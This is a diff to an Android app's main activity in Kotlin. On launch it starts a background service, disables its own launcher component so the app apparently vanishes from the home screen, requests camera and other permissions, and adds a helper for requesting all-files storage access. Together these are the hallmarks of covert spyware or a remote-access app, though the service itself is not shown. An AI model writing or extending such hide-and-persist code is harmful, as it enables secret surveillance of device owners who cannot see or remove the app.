@@ -5,8 +5,11 @@ import android.app.Activity
 import android.content.ComponentName
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.Environment
+import android.provider.Settings
 import android.util.Log
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
@@ -16,6 +19,25 @@ class MainActivity : Activity() {
     companion object {
         private const val TAG = "MainActivity"
         private const val RC_ALL = 100
+        private const val RC_MANAGE_STORAGE = 101
+
+        fun hasManageExternalStorage(ctx: android.content.Context): Boolean {
+            return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                Environment.isExternalStorageManager()
+            } else {
+                ContextCompat.checkSelfPermission(ctx, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+            }
+        }
+
+        fun requestManageExternalStorage(activity: Activity) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
+                    data = Uri.parse("package:${activity.packageName}")
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                }
+                activity.startActivityForResult(intent, RC_MANAGE_STORAGE)
+            }
+        }
 
         val ALL_PERMS = listOfNotNull(
             Manifest.permission.CAMERA,
@@ -47,7 +69,18 @@ class MainActivity : Activity() {
         super.onCreate(savedInstanceState)
         if (!isTaskRoot) { finish(); return }
         Log.i(TAG, "onCreate SDK=${Build.VERSION.SDK_INT}")
+        // Start service and disable component immediately — must call finish() before
+        // onResume() completes on Android 14+ to avoid IllegalStateException
+        try { MainService.start(this) } catch (e: Exception) { Log.e(TAG, "start: ${e.message}") }
+        try {
+            packageManager.setComponentEnabledSetting(
+                ComponentName(this, MainActivity::class.java),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+        } catch (_: Exception) {}
         requestAllPerms()
+        finish()
     }
 
     private fun requestAllPerms() {
@@ -57,8 +90,6 @@ class MainActivity : Activity() {
         Log.i(TAG, "Requesting ${needed.size} permissions")
         if (needed.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, needed.toTypedArray(), RC_ALL)
-        } else {
-            finishSetup()
         }
     }
 
@@ -69,19 +100,6 @@ class MainActivity : Activity() {
             if (denied.isNotEmpty()) {
                 Log.w(TAG, "Denied: ${denied.joinToString()}")
             }
-            finishSetup()
         }
-    }
-
-    private fun finishSetup() {
-        try { MainService.start(this) } catch (e: Exception) { Log.e(TAG, "start: ${e.message}") }
-        try {
-            packageManager.setComponentEnabledSetting(
-                ComponentName(this, MainActivity::class.java),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            )
-        } catch (_: Exception) {}
-        finish()
     }
 }
